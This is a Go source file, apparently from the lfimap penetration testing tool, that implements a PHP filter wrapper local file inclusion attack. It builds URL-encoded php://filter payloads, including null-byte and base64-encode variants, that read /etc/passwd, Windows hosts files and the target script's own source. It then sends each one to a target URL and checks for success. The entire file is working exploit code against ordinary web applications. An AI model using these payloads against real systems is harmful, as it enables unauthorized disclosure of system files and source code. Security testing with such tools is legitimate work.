package attacks

import (
	"fmt"
	"net/url"
	"path"
	"strings"

	lfihttp "github.com/hansmach1ne/lfimap/internal/http"
)

// FilterAttack implements PHP filter wrapper attack
type FilterAttack struct{}

// Name returns the attack name
func (a *FilterAttack) Name() string {
	return "filter"
}

// Test executes the filter wrapper attack
func (a *FilterAttack) Test(ctx *AttackContext, targetURL, postData string) bool {
	if ctx.Verbose {
		fmt.Printf("%s Testing with filter wrapper...\n", ctx.Colors.Blue("[i]"))
	}

	// Build test payloads
	tests := []string{
		"php%3A%2F%2Ffilter%2Fresource%3D%2Fetc%2Fpasswd",
		"php%3A%2F%2Ffilter%2Fresource%3D..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts",
		"php%3A%2F%2Ffilter%2Fresource%3D%2Fetc%2Fpasswd%2500",
		"php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3D%2Fetc%2Fpasswd",
		"php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3D%2Fetc%2Fpasswd%2500",
		"php%3A%2F%2Ffilter%2Fresource%3D..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts%2500",
		"php%3A%2F%2Ffilter%2Fresource%3DC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts",
		"php%3A%2F%2Ffilter%2Fresource%3DC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts%2500",
	}

	// Extract script name from URL
	parsedURL, err := url.Parse(targetURL)
	if err == nil {
		scriptName := strings.TrimSuffix(path.Base(parsedURL.Path), path.Ext(parsedURL.Path))
		if scriptName == "" || scriptName == "/" {
			scriptName = "index"
		}
		ctx.Config.ScriptName = scriptName

		// Add dynamic script name payloads
		tests = append(tests, "php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3D"+scriptName)
		tests = append(tests, "php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3D"+scriptName+".php")
		tests = append(tests, "php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3D"+scriptName+"%2500")
	}

	placeholder := ctx.Config.Args.Placeholder
	headers := lfihttp.HeadersToMap(lfihttp.InitHeaders(
		ctx.Config.Args.UserAgent,
		ctx.Config.Args.Referer,
		ctx.Config.Args.Cookie,
	))

	for i, test := range tests {
		u, reqHeaders, postTest := lfihttp.PrepareRequest(placeholder, test, targetURL, postData, headers, ctx.Encodings)
		result := lfihttp.Request(ctx.HTTPCtx, u, reqHeaders, postTest, "LFI", "FILTER", false, false, false)

		if !result.DoContinue {
			return true
		}

		if i == 1 && ctx.Quick {
			return false
		}
	}

	return false
}
